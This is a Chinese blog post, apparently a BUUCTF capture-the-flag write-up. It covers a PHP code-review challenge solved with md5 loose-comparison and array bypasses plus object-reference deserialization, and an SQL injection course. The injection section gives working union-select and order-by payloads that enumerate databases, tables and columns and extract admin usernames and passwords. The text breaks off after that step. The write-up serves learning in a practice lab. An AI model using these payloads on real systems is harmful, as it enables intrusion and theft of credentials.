@@ -1,0 +1,1327 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="basicBUU CODE REVIEW1代码审计题，内容如下分析一下代码内容，发现定义了一个类BUU类有两个公有变量correct和input，一个析构方法。在类的析构方法中对correct进行了base64编码的一个随机值赋值。也就是说把一个随机值赋值给了correct.然后对input和correct进行全等比较，相等就给出&#x2F;flag文件的内容。往下看，有一段判断首先检查了pleaseget">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf-wp">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;12&#x2F;buuctf-wp1&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="basicBUU CODE REVIEW1代码审计题，内容如下分析一下代码内容，发现定义了一个类BUU类有两个公有变量correct和input，一个析构方法。在类的析构方法中对correct进行了base64编码的一个随机值赋值。也就是说把一个随机值赋值给了correct.然后对input和correct进行全等比较，相等就给出&#x2F;flag文件的内容。往下看，有一段判断首先检查了pleaseget">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;13&#x2F;SGoQLfAvlj2sCPm.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;13&#x2F;ao9uCEkWRxmlKbf.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;13&#x2F;Jw8aux9giPNUEfv.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;13&#x2F;bF3L42kDMvlPSum.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;01&#x2F;EqJico4N2Uewg8I.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;01&#x2F;8ESXWDkHpJ4ZLyM.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;01&#x2F;9RrEgOMes7YKFWa.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;01&#x2F;L2Jb8Fc7TDtzovA.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;01&#x2F;hqrefDm7y92zVPN.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;01&#x2F;FZfd6hcGrT9Ib7O.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;01&#x2F;lXkhgx38LbVOn7c.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;01&#x2F;diSt4J52Way7vQc.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;01&#x2F;b2in1eEQVX8oITM.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;13&#x2F;k7TWCAxXeVEq5ph.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;13&#x2F;bU63Os21yErkRmn.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;13&#x2F;ZvosTnR3U1tLMQa.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;13&#x2F;ICJck5OfB8UpvrD.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;13&#x2F;Uq4ONxe5P9MsWnR.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;14&#x2F;3XBnIQh8Hwod1VP.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;14&#x2F;hxlkDS6QN2RPAFr.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;14&#x2F;vO5MfYyHb2jtq6L.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;14&#x2F;qhHwfUSnrIuov9x.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;14&#x2F;ZDJdYTLfB5XF12P.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;14&#x2F;jTb1flvrXZwIFDt.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;15&#x2F;gYKthskbMXO3Tyf.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;15&#x2F;Xyxd9mbA6IqLurD.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;15&#x2F;VQocefYCWJ5rlx2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;15&#x2F;ByQoAF5fXMaKNUm.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;15&#x2F;axsOdpMN6hYFnPS.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;15&#x2F;Yg5Lta7xjXfidUW.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;15&#x2F;pbA9Lfod2MsUFDn.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;15&#x2F;yKWNFbv1goTnP6r.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;15&#x2F;ZAPfyzlauJTSt1G.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;15&#x2F;WrKftVxNscknewo.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;15&#x2F;zlD2NaLqYCjXJ4I.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;07&#x2F;Upm3vkEn7T2tjl5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;07&#x2F;KFjT5YB7dh2zoZi.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;07&#x2F;gTwE4eFSUD29mQG.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;07&#x2F;UumWdvCcwA4laop.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;08&#x2F;UlYndZR2DWQgiJw.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;08&#x2F;hV7oH83ueiCA2bg.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;08&#x2F;YbSmWelQVkAJM7d.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;08&#x2F;tvS9Zu8OqPcwi1Q.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;08&#x2F;apCDuL9K4gBIb3N.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;08&#x2F;QCUoRWi5sadPE3G.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;08&#x2F;mVuKHQzgXG9i576.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;08&#x2F;1nNHZmwWYl6tCEQ.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;08&#x2F;TBLGFsrl3a8VOHu.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;08&#x2F;yXR7TxJoQzGw2jl.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;09&#x2F;y7JCuVQ1kKILFPr.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;09&#x2F;Dtmk65M3HC7TYQo.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;09&#x2F;FRjBxnA24C1QX5P.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;09&#x2F;3rMHDwUFfiVeoSn.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;09&#x2F;s4UTakMBxHLzXmC.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;09&#x2F;Z4BybJDoXLIc62u.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;09&#x2F;Y7xK3apXA2CeHrO.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;09&#x2F;FbSCPisNz1v8G9r.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;10&#x2F;b7xzufVt2Ll8OrS.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;10&#x2F;yIZqoRd4Awahzkg.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;10&#x2F;IKQa9DPx8YgzFWZ.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;10&#x2F;Pv6Nx3DXuIG9oad.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;10&#x2F;lsRydFoJSVzx8PI.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;10&#x2F;s5TrQOI7JVS2dxi.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;10&#x2F;rHkQMyKfiaJeI5E.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;11&#x2F;SZHzcyRDl2Fxdte.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;11&#x2F;O5TpvY2PKnwgRLV.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;11&#x2F;I8oqN2DOySKciQT.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;11&#x2F;nPYxw2iu6ZtGQEs.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;11&#x2F;QRDXSvAEhJWGuYf.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;12&#x2F;Qvs4HB8dNtnTJiS.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;12&#x2F;uDQE8CPsx3XzrVi.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;12&#x2F;7LboRWpBfZNtMkE.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;14&#x2F;Qrq7k3uE2jJaCYM.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;14&#x2F;IQYCAJ4PkVhsvbB.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;14&#x2F;JWBTjUHwpb83Igq.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;14&#x2F;l8we9T6QDWF1Ntj.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;14&#x2F;mCYXPTLG9I1oqOd.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;14&#x2F;y6VA8GgfCs2rNhp.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;14&#x2F;2zFQfuYrC1A3q95.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;14&#x2F;DdWoBiyAa2JIf6x.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;14&#x2F;1TdfkR4M83OiVDX.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;14&#x2F;WFQ4MDXcLIUNzwu.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;15&#x2F;KxSF3rUT9YHm4h8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;15&#x2F;8dbZkVW4XeJ76lD.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;15&#x2F;ymXaBMdU8rePCNY.png">
+<meta property="og:updated_time" content="2020-03-15T09:59:21.935Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;13&#x2F;SGoQLfAvlj2sCPm.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/12/buuctf-wp1/"/>
+
+
+
+
+
+  <title>buuctf-wp | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/12/buuctf-wp1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">buuctf-wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-12T14:16:17+08:00">
+                2020-02-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  21.4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  89
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="basic"><a href="#basic" class="headerlink" title="basic"></a>basic</h1><h2 id="BUU-CODE-REVIEW1"><a href="#BUU-CODE-REVIEW1" class="headerlink" title="BUU CODE REVIEW1"></a>BUU CODE REVIEW1</h2><p>代码审计题，内容如下<br><img src="https://i.loli.net/2020/02/13/SGoQLfAvlj2sCPm.png" alt="Snipaste_2020-02-13_10-44-55.png"><br>分析一下代码内容，发现定义了一个类BUU<br>类有两个公有变量correct和input，一个析构方法。<br>在类的析构方法中对correct进行了base64编码的一个随机值赋值。也就是说把一个随机值赋值给了correct.<br>然后对input和correct进行全等比较，相等就给出/flag文件的内容。<br>往下看，有一段判断<br>首先检查了pleaseget参数<br>然后检查了pleastpost参数<br>再然后是检查了md51和md52这两个参数。这里首先检查了md51和md52哈希后的结果，是==检查的，还检查了md51和md52内容不相等。<br>也就是说，要求md51和md52的内容不相等，但是它们的md5结果要相等<br>最后将post上来的对象反序列化(要触发析构函数的嘛)<br>————分割线——————<br>知道了代码判断逻辑，和要求，想办法利用。<br>这里笔者使用postman和phpstudy<br>首先因为类的析构函数将一个随机值赋值给correct然后再用input和correct比较，<br>必须要想办法让input的值时刻和correct相同。<br>这里利用引用的方法解决。也就是<br>$input = &amp;$correct;<br><strong>笔者使用的代码如下</strong><br><img src="https://i.loli.net/2020/02/13/ao9uCEkWRxmlKbf.png" alt="Snipaste_2020-02-13_10-58-04.png"><br>可以看到笔者将创建的对象的input引用了correct,然后将对象序列化(为了上传)<br>然后打开postman，设定参数，前面的pleaseget和pleasepost没什么好说的了。填进去就行。<br>这里的考点在md51和md52的比较。要求md51和md52加密的md5值相等，并且md51和md52值不等。<br>这里有三种方法绕过</p>
+<ol>
+<li>0e绕过，php的==等号会对0e开头的内容直接判断相等，所以只需要找加密后值为0e的两个不同的值上传就行</li>
+<li>数组绕过，对数组进行md5操作会返回false，两个false当然相等，如果数组内容不等那么md51和md52当然不等</li>
+<li>md5对撞。意思就是两个不同的内容，加密后的密文一样，举个例子就是absadfsafs和dasidfuhfihlfsimd5加密后会相等但是他们本身不相等。(例子是随便说的懂意思就行)</li>
+</ol>
+<p><strong>使用0e绕过获取flag如下</strong><br><img src="https://i.loli.net/2020/02/13/Jw8aux9giPNUEfv.png" alt="Snipaste_2020-02-13_11-07-16.png"><br><strong>使用数组绕过获取flag如下</strong><br>需要注意要上传数组需要在md51和md52后面加上[]括号，表示变量是数组<br><img src="https://i.loli.net/2020/02/13/bF3L42kDMvlPSum.png" alt="Snipaste_2020-02-13_11-10-14.png"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
+<li>使用引用的方法绕过类变类的全等比较(===)</li>
+<li>使用上述三种方法绕过md5加密后相等而md5值不等的情况</li>
+</ol>
+<h2 id="BUU-SQL-COURSE1"><a href="#BUU-SQL-COURSE1" class="headerlink" title="BUU SQL COURSE1"></a>BUU SQL COURSE1</h2><p>这道题是注入题，对于我这种蒻赍来说，还是非常有必要从非常基础题进行总结的。<br>进去的页面是这样的<br><img src="https://i.loli.net/2020/03/01/EqJico4N2Uewg8I.png" alt="Snipaste_2020-03-01_10-48-58.png"><br>随便点一个看看，发现内容变化了。<br>抓包看看<br><img src="https://i.loli.net/2020/03/01/8ESXWDkHpJ4ZLyM.png" alt="Snipaste_2020-03-01_10-49-19.png"><br>发现后端请求的时候有个id参数。<br>单独把这个请求url拿出来看看，发现返回了json数据<br><img src="https://i.loli.net/2020/03/01/9RrEgOMes7YKFWa.png" alt="Snipaste_2020-03-01_10-51-43.png"><br>在这里判断一下是不是有注入点<br>使用以下数据分别测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos; or &apos;1&apos; = &apos;1</span><br><span class="line"> or 1 = 1</span><br><span class="line"> and 1 = 2</span><br></pre></td></tr></table></figure>
+<p> 发现这里不需要使用单引号闭合。并且or可以查到数据但and查询不到数据<br> <strong>可以判断id处存在注入点</strong><br> <strong>需要注意的是，只有id=0的时候才发现注入数据有回显</strong></p>
+<h3 id="查看返回的列数"><a href="#查看返回的列数" class="headerlink" title="查看返回的列数"></a>查看返回的列数</h3><p> 这里想要使用union来联合查询，但是这个语句有一个限制。<br> 就是你union select 后面查询的列数一定要和之前的查询列数相等。<br> 所以这里首先要确定以下返回的列数到底是几列。</p>
+<h4 id="使用union-select直接测试"><a href="#使用union-select直接测试" class="headerlink" title="使用union select直接测试"></a>使用union select直接测试</h4><p> 可以直接使用<br> union select 1<br> union select 1,2<br> union select 1,2,3…<br> 这种方法直接怼上去，发现有回显就可以确定返回数据的列数</p>
+<h4 id="使用order-by语句"><a href="#使用order-by语句" class="headerlink" title="使用order by语句"></a>使用order by语句</h4><p> 也可以使用order by语句进行语句排序来确定数据列数。<br> 在原有查询后面加上 order by语句(如果需要引号闭合需要先闭合，这题没有引号闭合所以不需要闭合)<br> order by 1<br> order by 2<br> order by 3…<br> 一直到发现返回信息有报错或者明显不同，即可判断列数。<br> 比如本题使用order by 3时，注入明显不对。由此可以判断返回列数为2</p>
+<h3 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h3><p> 这里发现一个SQL的语句使用规则，就是你查询一样东西，比如 select * from xx.<br> <strong>这里这个xx一定是一个table。</strong><br> 这题没有使用任何过滤，先构造一个查询数据库的语句<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA --+</span><br></pre></td></tr></table></figure><br> 各数据库名是保存在information_schema这个数据库的SCHEMATA这个表中的。可以看到当前数据库的有以下几个<br> <img src="https://i.loli.net/2020/03/01/L2Jb8Fc7TDtzovA.png" alt="Snipaste_2020-03-01_11-12-44.png"><br> 根据内容判断，我们当前应该处在news数据库中。</p>
+<h3 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h3><p> 各个数据库的表名保存在information_schema这个数据库的tables这个表中。<br> 所以可以构造一个这样的语句查询<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(TABLE_NAME) from information_schema.tables where table_schema = &apos;news&apos; --+</span><br><span class="line">union select 1,group_concat(TABLE_NAME) from information_schema.tables where table_schema = database() --+</span><br></pre></td></tr></table></figure><br><strong>要查询表名，这里还指定了数据库的条件，表示只查询某个特定数据库的表名</strong><br>这里看到第二个构造语句后面的table_schema=database()<br>解析一下，database()这个函数默认返回当前数据库的名字。所以如果你不确定你所在的数据库名字，可以使用这种方法。<br>查询到的表有两个<br><img src="https://i.loli.net/2020/03/01/hqrefDm7y92zVPN.png" alt="Snipaste_2020-03-01_11-34-52.png"></p>
+<h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><p>所有数据库的列名都保存在information_schema这个数据库的columns这个表中。要查询列名可以构造如下语句<br>这里指定了数据库名和表名条件，如果不指定，将返回所有数据库的所有列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(COLUMN_NAME) from information_schema.columns where table_schema = &apos;news&apos; and table_name = &apos;admin&apos; --+</span><br><span class="line">union select 1,group_concat(COLUMN_NAME) from information_schema.columns where table_name = &apos;admin&apos; --+</span><br></pre></td></tr></table></figure>
+<p>查询的时候可以显式指出要查询的数据库名，如果不指出，默认会从当前数据库内查询。<br>可以看到查询结果有三列<br><img src="https://i.loli.net/2020/03/01/FZfd6hcGrT9Ib7O.png" alt="Snipaste_2020-03-01_11-44-41.png"></p>
+<h3 id="提取数据"><a href="#提取数据" class="headerlink" title="提取数据"></a>提取数据</h3><p>这里有两列是我们比较感兴趣的，username这一列和password这一列。<br>先提取admin这一列的数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(username) from admin --+</span><br><span class="line">union select 1,group_concat(username) from news.admin --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/03/01/lXkhgx38LbVOn7c.png" alt="Snipaste_2020-03-01_11-52-08.png"><br><strong>这里要注意，from后面的数据库名没加单引号</strong><br>同时，还可以使用schema.table的语法来指定查询的表名<br>再提取password这一列的数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(password) from admin --+</span><br><span class="line">union select 1,group_concat(password) from news.admin --+</span><br></pre></td></tr></table></figure>
